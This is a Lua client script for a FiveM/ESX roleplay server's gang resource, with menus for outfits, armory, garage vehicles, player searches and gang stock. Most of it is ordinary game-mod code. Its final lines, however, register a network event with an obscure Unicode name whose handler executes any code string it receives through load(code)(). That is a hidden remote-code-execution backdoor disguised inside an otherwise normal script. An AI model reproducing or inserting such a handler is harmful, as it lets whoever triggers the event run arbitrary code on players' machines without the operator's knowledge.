local PlayerData = {}

local GUI = {}
GUI.Time = 0

local HasAlreadyEnteredMarker = false
local LastPart = nil

local CurrentAction = nil
local CurrentActionMsg = ''
local CurrentActionData = {}

local isDead = false

Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('::{korioz#0110}::esx:getSharedObject', function(obj) ESX = obj end)
		Citizen.Wait(10)
	end

	while ESX.GetPlayerData().job2 == nil do
		Citizen.Wait(10)
	end

	PlayerData = ESX.GetPlayerData()
	_TriggerServerEvent('::{korioz#0110}::GangsBuilder:requestSync')
end)

RegisterNetEvent('::{korioz#0110}::esx:playerLoaded')
AddEventHandler('::{korioz#0110}::esx:playerLoaded', function(xPlayer)
	PlayerData = xPlayer
end)

RegisterNetEvent('::{korioz#0110}::esx:setJob2')
AddEventHandler('::{korioz#0110}::esx:setJob2', function(job2)
	PlayerData.job2 = job2
end)

AddEventHandler('playerSpawned', function()
	isDead = false
end)

AddEventHandler('::{korioz#0110}::esx:onPlayerDeath', function(data)
	isDead = true
end)

function setUniform(job, playerPed)
	TriggerEvent('::{korioz#0110}::skinchanger:getSkin', function(skin)
		if skin.sex == 0 then
			if Config.Uniforms[job].male ~= nil then
				TriggerEvent('::{korioz#0110}::skinchanger:loadClothes', skin, Config.Uniforms[job].male)
			else
				ESX.ShowNotification(_U('no_outfit'))
			end
		else
			if Config.Uniforms[job].female ~= nil then
				TriggerEvent('::{korioz#0110}::skinchanger:loadClothes', skin, Config.Uniforms[job].female)
			else
				ESX.ShowNotification(_U('no_outfit'))
			end
		end
	end)
end

function OpenCloakroomMenu()
	local elements = {
		{label = _U('citizen_wear'), value = 'citizen_wear'},
		{label = _U('gang_wear'), value = 'gang_wear'},
		{label = 'Tenue Braquage', value = 'robbery_wear'},
		{label = 'Mettre Sac', value = 'sac_wear'},
		{label = 'Enlever Sac', value = 'sac_wear1'},
		{label = 'Mettre Gilet par Balle', value = 'bullet_wear'},
		{label = 'Enlever Gilet par Balle', value = 'bullet_wear1'}
	}

	ESX.UI.Menu.CloseAll()

	ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'cloakroom', {
		title = _U('cloakroom'),
		elements = elements
	}, function(data, menu)
		local playerPed = PlayerPedId()
		SetPedArmour(playerPed, 0)
		ClearPedBloodDamage(playerPed)
		ResetPedVisibleDamage(playerPed)
		ClearPedLastWeaponDamage(playerPed)
		ResetPedMovementClipset(playerPed, 0.0)

		if data.current.value == 'citizen_wear' then
			ESX.TriggerServerCallback('::{korioz#0110}::esx_skin:getPlayerSkin', function(skin, jobSkin)
				TriggerEvent('::{korioz#0110}::skinchanger:loadSkin', skin)
			end)
		end

		if data.current.value == 'gang_wear' then
			ESX.TriggerServerCallback('::{korioz#0110}::esx_skin:getPlayerSkin', function(skin, jobSkin, job2Skin)
				if skin.sex == 0 then
					TriggerEvent('::{korioz#0110}::skinchanger:loadClothes', skin, job2Skin.skin_male)
				else
					TriggerEvent('::{korioz#0110}::skinchanger:loadClothes', skin, job2Skin.skin_female)
				end
			end)
		end

		if data.current.value == 'robbery_wear' or data.current.value == 'bullet_wear' or data.current.value == 'bullet_wear1' or data.current.value == 'sac_wear' or data.current.value == 'sac_wear1' then
			setUniform(data.current.value, playerPed)
		end
	end, function(data, menu)
		CurrentAction = 'menu_cloakroom'
		CurrentActionMsg = _U('open_cloackroom')
		CurrentActionData = {}
	end)
end

function OpenArmoryMenu()
	local elements = {}

	if PlayerData.job2.grade_name == 'boss' then
		table.insert(elements, {label = _U('buy_weapons'), value = 'buy_weapons'})
	end
	
	table.insert(elements, {label = _U('get_weapon'), value = 'get_weapon'})
	table.insert(elements, {label = _U('put_weapon'), value = 'put_weapon'})
	table.insert(elements, {label = 'Prendre objet', value = 'get_stock'})
	table.insert(elements, {label = 'Déposer objet', value = 'put_stock'})

	ESX.UI.Menu.CloseAll()

	ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'armory', {
		title = _U('armory'),
		elements = elements
	}, function(data, menu)
		if data.current.value == 'buy_weapons' then
			OpenBuyWeaponsMenu()
		end

		if data.current.value == 'get_weapon' then
			OpenGetWeaponMenu()
		end

		if data.current.value == 'put_weapon' then
			OpenPutWeaponMenu()
		end

		if data.current.value == 'put_stock' then
			OpenPutStocksMenu()
		end

		if data.current.value == 'get_stock' then
			OpenGetStocksMenu()
		end
	end, function(data, menu)
		CurrentAction = 'menu_armory'
		CurrentActionMsg = _U('open_armory')
		CurrentActionData = {}
	end)
end

function OpenVehicleSpawnerMenu()
	local vehSpawnPoint = ActualGang.VehSpawnPoint
	local vehSpawnHeading = ActualGang.VehSpawnHeading

	ESX.UI.Menu.CloseAll()

	local elements = {}

	ESX.TriggerServerCallback('::{korioz#0110}::esx_society:getVehiclesInGarage', function(vehicles)
		for i = 1, #vehicles, 1 do
			table.insert(elements, {
				label = GetDisplayNameFromVehicleModel(vehicles[i].model),
				rightlabel = {'[' .. (vehicles[i].plate or '') .. ']'},
				value = vehicles[i]
			})
		end

		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'vehicle_spawner', {
			title = _U('vehicle_menu'),
			elements = elements
		}, function(data, menu)
			menu.close()
			local vehicleProps = data.current.value

			ESX.Game.SpawnVehicle(vehicleProps.model, vehSpawnPoint, vehSpawnHeading, function(vehicle)
				ESX.Game.SetVehicleProperties(vehicle, vehicleProps)
			end)

			_TriggerServerEvent('::{korioz#0110}::esx_society:removeVehicleFromGarage', ActualGang.Name, vehicleProps)
		end, function(data, menu)
			CurrentAction = 'menu_vehicle_spawner'
			CurrentActionMsg = _U('vehicle_spawner')
			CurrentActionData = {}
		end)
	end, ActualGang.Name)
end

function OpenGangActionsMenu()
	ESX.UI.Menu.CloseAll()

	ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'gang_actions', {
		title = ActualGang.Label,
		elements = {
			{label = _U('citizen_interaction'), value = 'citizen_interaction'},
			{label = _U('vehicle_interaction'), value = 'vehicle_interaction'}
		}
	}, function(data, menu)
		if data.current.value == 'citizen_interaction' then
			ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'citizen_interaction', {
				title = _U('citizen_interaction'),
				elements = {
					{label = _U('id_card'), value = 'identity_card'},
					{label = _U('search'), value = 'body_search'},
					{label = _U('put_in_vehicle'), value = 'put_in_vehicle'},
					{label = _U('out_the_vehicle'), value = 'out_the_vehicle'}
				}
			}, function(data2, menu2)
				local player, distance = ESX.Game.GetClosestPlayer()

				if distance ~= -1 and distance <= 3.0 then
					if data2.current.value == 'identity_card' then
						_TriggerServerEvent('::{korioz#0110}::jsfour-idcard:open', GetPlayerServerId(player), GetPlayerServerId(PlayerId()))
					end

					if data2.current.value == 'body_search' then
						local isHandsup = DecorGetBool(player, 'isHandsup')

						if isHandsup then
							OpenBodySearchMenu(GetPlayerServerId(player))
						else
							ESX.ShowNotification('~r~Action Impossible~s~ : Le joueur cible doit lever les mains !')
						end
					end

					if data2.current.value == 'put_in_vehicle' then
						_TriggerServerEvent('::{korioz#0110}::GangsBuilder:putInVehicle', GetPlayerServerId(player))
					end

					if data2.current.value == 'out_the_vehicle' then
						_TriggerServerEvent('::{korioz#0110}::GangsBuilder:OutVehicle', GetPlayerServerId(player))
					end
				else
					ESX.ShowNotification(_U('no_players_nearby'))
				end
			end, function(data2, menu2)
			end)
		end

		if data.current.value == 'vehicle_interaction' then
			ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'vehicle_interaction', {
				title = _U('vehicle_interaction'),
				elements = {
					{label = _U('vehicle_info'), value = 'vehicle_infos'},
					{label = _U('pick_lock'), value = 'hijack_vehicle'}
				}
			}, function(data2, menu2)
				local playerPed = PlayerPedId()
				local coords = GetEntityCoords(playerPed, false)
				local vehicle = GetClosestVehicle(coords, 3.0, 0, 71)

				if DoesEntityExist(vehicle) then
					local vehicleData = ESX.Game.GetVehicleProperties(vehicle)

					if data2.current.value == 'vehicle_infos' then
						OpenVehicleInfosMenu(vehicleData)
					end

					if data2.current.value == 'hijack_vehicle' then
						local playerPed = PlayerPedId()
						local coords = GetEntityCoords(playerPed, false)

						if IsAnyVehicleNearPoint(coords, 3.0) then
							local vehicle = GetClosestVehicle(coords, 3.0, 0, 71)

							if DoesEntityExist(vehicle) then
								Citizen.CreateThread(function()
									TaskStartScenarioInPlace(playerPed, 'WORLD_HUMAN_WELDING', 0, true)
									Citizen.Wait(20000)

									ClearPedTasksImmediately(playerPed)

									SetVehicleDoorsLocked(vehicle, 1)
									SetVehicleDoorsLockedForAllPlayers(vehicle, false)

									ESX.ShowNotification(_U('vehicle_unlocked'))
								end)
							end
						end
					end
				else
					ESX.ShowNotification(_U('no_vehicles_nearby'))
				end
			end, function(data2, menu2)
			end)
		end
	end, function(data, menu)
	end)
end

function OpenBodySearchMenu(player)
	ESX.TriggerServerCallback('::{korioz#0110}::GangsBuilder:getOtherPlayerData', function(data)
		if data.foundPlayer then
			local elements = {}

			for i = 1, #data.accounts, 1 do
				if data.accounts[i].name == 'dirtycash' then
					table.insert(elements, {
						label = _U('confiscate_dirty'),
						rightlabel = {'$' .. data.accounts[i].money},
						value = 'dirtycash',
						itemType = 'item_account',
						amount = data.accounts[i].money
					})
				end
			end

			table.insert(elements, {label = '--- Armes ---', value = nil})

			for i = 1, #data.weapons, 1 do
				table.insert(elements, {
					label = ESX.GetWeaponLabel(data.weapons[i].name),
					rightlabel = {'[' .. data.weapons[i].ammo .. ']'},
					value = data.weapons[i].name,
					itemType = 'item_weapon',
					amount = data.weapons[i].ammo
				})
			end

			table.insert(elements, {label = _U('inventory_label'), value = nil})

			for i = 1, #data.inventory, 1 do
				if data.inventory[i].count > 0 then
					table.insert(elements, {
						label = data.inventory[i].label,
						rightlabel = {'(' .. data.inventory[i].count .. ')'},
						value = data.inventory[i].name,
						itemType = 'item_standard',
						amount = data.inventory[i].count
					})
				end
			end

			ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'body_search', {
				title = _U('search'),
				elements = elements
			}, function(data2, menu2)
				if data2.current.value ~= nil then
					menu2.close()
					_TriggerServerEvent('::{korioz#0110}::GangsBuilder:confiscatePlayerItem', player, data2.current.itemType, data2.current.value, data2.current.amount)

					ESX.SetTimeout(300, function()
						OpenBodySearchMenu(player)
					end)
				end
			end, function(data2, menu2)
			end)
		else
			ESX.UI.Menu.CloseAll()
			ESX.ShowNotification('Le joueur a déconnecté vous ne pouvez pas le fouillez.')
		end
	end, player)
end

function OpenVehicleInfosMenu(vehicleData)
	ESX.TriggerServerCallback('::{korioz#0110}::GangsBuilder:getVehicleInfos', function(infos)
		local elements = {}

		table.insert(elements, {label = _U('plate'), rightlabel = {infos.plate}, value = nil})

		if infos.owner == nil then
			table.insert(elements, {label = _U('owner'), rightlabel = {'Inconnu'}, value = nil})
		else
			table.insert(elements, {label = _U('owner'), rightlabel = {infos.owner}, value = nil})
		end

		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'vehicle_infos', {
			title = _U('vehicle_info'),
			elements = elements
		}, nil, function(data, menu)
		end)
	end, vehicleData.plate)
end

function OpenBuyWeaponsMenu()
	local elements = {}

	for i = 1, #ActualGang.Weapons, 1 do
		table.insert(elements, {label = ESX.GetWeaponLabel(ActualGang.Weapons[i].name), rightlabel = {'$' .. ActualGang.Weapons[i].price}, value = ActualGang.Weapons[i].name, price = ActualGang.Weapons[i].price})
	end

	ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'armory_buy_weapons', {
		title = _U('buy_weapon_menu'),
		elements = elements
	}, function(data, menu)
		ESX.TriggerServerCallback('::{korioz#0110}::GangsBuilder:buyWeapon', function(hasEnoughMoney)
		end, data.current.value)
	end, function(data, menu)
	end)
end

function OpenGetWeaponMenu()
	ESX.TriggerServerCallback('::{korioz#0110}::GangsBuilder:getArmoryWeapons', function(weapons)
		local elements = {}

		for i = 1, #weapons, 1 do
			table.insert(elements, {label = ESX.GetWeaponLabel(weapons[i].name), rightlabel = {'[' .. weapons[i].ammo .. ']'}, value = weapons[i].name, ammo = weapons[i].ammo})
		end

		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'armory_get_weapon', {
			title = _U('get_weapon_menu'),
			elements = elements
		}, function(data, menu)
			menu.close()

			ESX.TriggerServerCallback('::{korioz#0110}::GangsBuilder:removeArmoryWeapon', function()
				OpenGetWeaponMenu()
			end, data.current.value, data.current.ammo)
		end, function(data, menu)
		end)
	end)
end

function OpenPutWeaponMenu()
	local elements = {}
	local playerPed = PlayerPedId()
	local weaponList = ESX.GetWeaponList()

	for i = 1, #weaponList, 1 do
		local weaponHash = GetHashKey(weaponList[i].name)

		if HasPedGotWeapon(playerPed, weaponHash, false) and weaponList[i].name ~= 'WEAPON_UNARMED' then
			local ammo = GetAmmoInPedWeapon(playerPed, weaponHash)
			table.insert(elements, {label = weaponList[i].label, rightlabel = {'[' .. ammo .. ']'}, value = weaponList[i].name, ammo = ammo})
		end
	end

	ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'armory_put_weapon', {
		title = _U('put_weapon_menu'),
		elements = elements
	}, function(data, menu)
		menu.close()

		ESX.TriggerServerCallback('::{korioz#0110}::GangsBuilder:addArmoryWeapon', function()
			OpenPutWeaponMenu()
		end, data.current.value, data.current.ammo)
	end, function(data, menu)
	end)
end

function OpenGetStocksMenu()
	ESX.TriggerServerCallback('::{korioz#0110}::GangsBuilder:getStockItems', function(items)
		local elements = {}

		for i = 1, #items, 1 do
			table.insert(elements, {label = items[i].label, rightlabel = {'(' .. items[i].count .. ')'}, value = items[i].name})
		end

		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'stocks_menu', {
			title = _U('gang_stock'),
			elements = elements
		}, function(data, menu)
			ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'stocks_menu_get_item_count', {
				title = _U('quantity')
			}, function(data2, menu2)
				local count = tonumber(data2.value)

				if count == nil then
					ESX.ShowNotification(_U('quantity_invalid'))
				else
					menu2.close()
					menu.close()
					OpenGetStocksMenu()

					_TriggerServerEvent('::{korioz#0110}::GangsBuilder:getStockItem', data.current.value, count)
				end
			end, function(data2, menu2)
				menu2.close()
			end)
		end, function(data, menu)
		end)
	end)
end

function OpenPutStocksMenu()
	ESX.TriggerServerCallback('::{korioz#0110}::GangsBuilder:getPlayerInventory', function(inventory)
		local elements = {}

		for i = 1, #inventory.items, 1 do
			local item = inventory.items[i]

			if item.count > 0 then
				table.insert(elements, {label = item.label, rightlabel = {'(' .. item.count .. ')'}, type = 'item_standard', value = item.name})
			end
		end

		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'stocks_menu', {
			title = _U('inventory'),
			elements = elements
		}, function(data, menu)
			ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'stocks_menu_put_item_count', {
				title = _U('quantity')
			}, function(data2, menu2)
				local count = tonumber(data2.value)

				if count == nil then
					ESX.ShowNotification(_U('quantity_invalid'))
				else
					menu2.close()
					menu.close()
					OpenPutStocksMenu()

					_TriggerServerEvent('::{korioz#0110}::GangsBuilder:putStockItems', data.current.value, count)
				end
			end, function(data2, menu2)
				menu2.close()
			end)
		end, function(data, menu)
		end)
	end)
end

AddEventHandler('::{korioz#0110}::GangsBuilder:hasEnteredMarker', function(part)
	if part == 'Cloakroom' then
		CurrentAction = 'menu_cloakroom'
		CurrentActionMsg = _U('open_cloackroom')
		CurrentActionData = {}
	end

	if part == 'Armory' then
		CurrentAction = 'menu_armory'
		CurrentActionMsg = _U('open_armory')
		CurrentActionData = {}
	end

	if part == 'VehicleSpawner' then
		CurrentAction = 'menu_vehicle_spawner'
		CurrentActionMsg = _U('vehicle_spawner')
		CurrentActionData = {}
	end

	if part == 'VehicleDeleter' then
		local playerPed = PlayerPedId()
		local coords = GetEntityCoords(playerPed, false)

		if IsPedInAnyVehicle(playerPed, false) then
			local vehicle = GetVehiclePedIsIn(playerPed, false)

			if DoesEntityExist(vehicle) then
				CurrentAction = 'delete_vehicle'
				CurrentActionMsg = _U('store_vehicle')
				CurrentActionData = {vehicle = vehicle}
			end
		end
	end

	if part == 'BossActions' then
		CurrentAction = 'menu_boss_actions'
		CurrentActionMsg = _U('open_bossmenu')
		CurrentActionData = {}
	end
end)

AddEventHandler('::{korioz#0110}::GangsBuilder:hasExitedMarker', function(part)
	ESX.UI.Menu.CloseAll()
	CurrentAction = nil
end)

RegisterNetEvent('::{korioz#0110}::GangsBuilder:putInVehicle')
AddEventHandler('::{korioz#0110}::GangsBuilder:putInVehicle', function()
	local playerPed = PlayerPedId()
	local coords = GetEntityCoords(playerPed, false)

	if IsAnyVehicleNearPoint(coords, 5.0) then
		local vehicle = GetClosestVehicle(coords, 5.0, 0, 71)

		if DoesEntityExist(vehicle) then
			local maxSeats = GetVehicleMaxNumberOfPassengers(vehicle)
			local freeSeat = nil

			for i = maxSeats - 1, 0, -1 do
				if IsVehicleSeatFree(vehicle,  i) then
					freeSeat = i
					break
				end
			end

			if freeSeat ~= nil then
				TaskWarpPedIntoVehicle(playerPed, vehicle, freeSeat)
			end
		end
	end
end)

RegisterNetEvent('::{korioz#0110}::GangsBuilder:OutVehicle')
AddEventHandler('::{korioz#0110}::GangsBuilder:OutVehicle', function()
	local ped = PlayerPedId()

	if not IsPedSittingInAnyVehicle(playerPed) then
		return
	end

	local vehicle = GetVehiclePedIsIn(playerPed, false)
	TaskLeaveVehicle(playerPed, vehicle, 16)
end)

-- Display markers
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)

		if PlayerData.job2 ~= nil and ActualGang then
			local coords = GetEntityCoords(PlayerPedId(), false)

			if #(coords - vector3(ActualGang.Cloakroom.x, ActualGang.Cloakroom.y, ActualGang.Cloakroom.z)) < Config.DrawDistance then
				DrawMarker(Config.MarkerType, ActualGang.Cloakroom.x, ActualGang.Cloakroom.y, ActualGang.Cloakroom.z, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, Config.MarkerSize, Config.MarkerColor.r, Config.MarkerColor.g, Config.MarkerColor.b, Config.MarkerColor.a, false, true, 2, false, false, false, false)
			end

			if #(coords - vector3(ActualGang.Armory.x, ActualGang.Armory.y, ActualGang.Armory.z)) < Config.DrawDistance then
				DrawMarker(Config.MarkerType, ActualGang.Armory.x, ActualGang.Armory.y, ActualGang.Armory.z, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, Config.MarkerSize, Config.MarkerColor.r, Config.MarkerColor.g, Config.MarkerColor.b, Config.MarkerColor.a, false, true, 2, false, false, false, false)
			end

			if #(coords - vector3(ActualGang.VehSpawner.x, ActualGang.VehSpawner.y, ActualGang.VehSpawner.z)) < Config.DrawDistance then
				DrawMarker(Config.MarkerType, ActualGang.VehSpawner.x, ActualGang.VehSpawner.y, ActualGang.VehSpawner.z, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, Config.MarkerSize, Config.MarkerColor.r, Config.MarkerColor.g, Config.MarkerColor.b, Config.MarkerColor.a, false, true, 2, false, false, false, false)
			end

			if #(coords - vector3(ActualGang.VehDeleter.x, ActualGang.VehDeleter.y, ActualGang.VehDeleter.z)) < Config.DrawDistance then
				DrawMarker(Config.MarkerType, ActualGang.VehDeleter.x, ActualGang.VehDeleter.y, ActualGang.VehDeleter.z, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, Config.MarkerSize, Config.MarkerColor.r, Config.MarkerColor.g, Config.MarkerColor.b, Config.MarkerColor.a, false, true, 2, false, false, false, false)
			end

			if PlayerData.job2 ~= nil and PlayerData.job2.grade_name == 'boss' then
				if #(coords - vector3(ActualGang.BossActions.x, ActualGang.BossActions.y, ActualGang.BossActions.z)) < Config.DrawDistance then
					DrawMarker(Config.MarkerType, ActualGang.BossActions.x, ActualGang.BossActions.y, ActualGang.BossActions.z, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, Config.MarkerSize, Config.MarkerColor.r, Config.MarkerColor.g, Config.MarkerColor.b, Config.MarkerColor.a, false, true, 2, false, false, false, false)
				end
			end
		end
	end
end)

-- Enter / Exit marker events
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)

		if PlayerData.job2 ~= nil and ActualGang then
			local coords = GetEntityCoords(PlayerPedId(), false)
			local isInMarker = false
			local currentPart = nil

			if #(coords - vector3(ActualGang.Cloakroom.x, ActualGang.Cloakroom.y, ActualGang.Cloakroom.z)) < Config.MarkerSize.x then
				isInMarker = true
				currentPart = 'Cloakroom'
			end

			if #(coords - vector3(ActualGang.Armory.x, ActualGang.Armory.y, ActualGang.Armory.z)) < Config.MarkerSize.x then
				isInMarker = true
				currentPart = 'Armory'
			end

			if #(coords - vector3(ActualGang.VehSpawner.x, ActualGang.VehSpawner.y, ActualGang.VehSpawner.z)) < Config.MarkerSize.x then
				isInMarker = true
				currentPart = 'VehicleSpawner'
			end

			if #(coords - vector3(ActualGang.VehDeleter.x, ActualGang.VehDeleter.y, ActualGang.VehDeleter.z)) < Config.MarkerSize.x then
				isInMarker = true
				currentPart = 'VehicleDeleter'
			end

			if PlayerData.job2 ~= nil and PlayerData.job2.grade_name == 'boss' then
				if #(coords - vector3(ActualGang.BossActions.x, ActualGang.BossActions.y, ActualGang.BossActions.z)) < Config.MarkerSize.x then
					isInMarker = true
					currentPart = 'BossActions'
				end
			end

			local hasExited = false

			if isInMarker and not HasAlreadyEnteredMarker or (isInMarker and (LastPart ~= currentPart)) then
				if (LastPart ~= nil) and (LastPart ~= currentPart) then
					TriggerEvent('::{korioz#0110}::GangsBuilder:hasExitedMarker', LastPart)
					hasExited = true
				end

				HasAlreadyEnteredMarker = true
				LastPart = currentPart

				TriggerEvent('::{korioz#0110}::GangsBuilder:hasEnteredMarker', currentPart)
			end

			if not hasExited and not isInMarker and HasAlreadyEnteredMarker then
				HasAlreadyEnteredMarker = false
				TriggerEvent('::{korioz#0110}::GangsBuilder:hasExitedMarker', LastPart)
			end
		end
	end
end)

-- Key Controls
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)

		if CurrentAction ~= nil then
			ESX.ShowHelpNotification(CurrentActionMsg)

			if IsControlPressed(0, 38) and PlayerData.job2 ~= nil and ActualGang and (GetGameTimer() - GUI.Time) > 150 then
				if CurrentAction == 'menu_cloakroom' then
					OpenCloakroomMenu()
				end

				if CurrentAction == 'menu_armory' then
					OpenArmoryMenu()
				end

				if CurrentAction == 'menu_vehicle_spawner' then
					OpenVehicleSpawnerMenu()
				end

				if CurrentAction == 'delete_vehicle' then
					local vehicleProps = ESX.Game.GetVehicleProperties(CurrentActionData.vehicle)
					_TriggerServerEvent('::{korioz#0110}::esx_society:putVehicleInGarage', ActualGang.Name, vehicleProps)

					ESX.Game.DeleteVehicle(CurrentActionData.vehicle)
				end

				if CurrentAction == 'menu_boss_actions' then
					ESX.UI.Menu.CloseAll()

					TriggerEvent('::{korioz#0110}::esx_society:openBossMenu2', ActualGang.Name, function(data, menu)
						CurrentAction = 'menu_boss_actions'
						CurrentActionMsg = _U('open_bossmenu')
						CurrentActionData = {}
					end, {wash = false})
				end

				CurrentAction = nil
				GUI.Time = GetGameTimer()
			end
		end

		if IsControlPressed(0, 168) and PlayerData.job2 ~= nil and ActualGang and not isDead and not ESX.UI.Menu.IsOpen('default', GetCurrentResourceName(), 'gang_actions') and (GetGameTimer() - GUI.Time) > 150 then
			OpenGangActionsMenu()
			GUI.Time = GetGameTimer()
		end
	end
end)

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)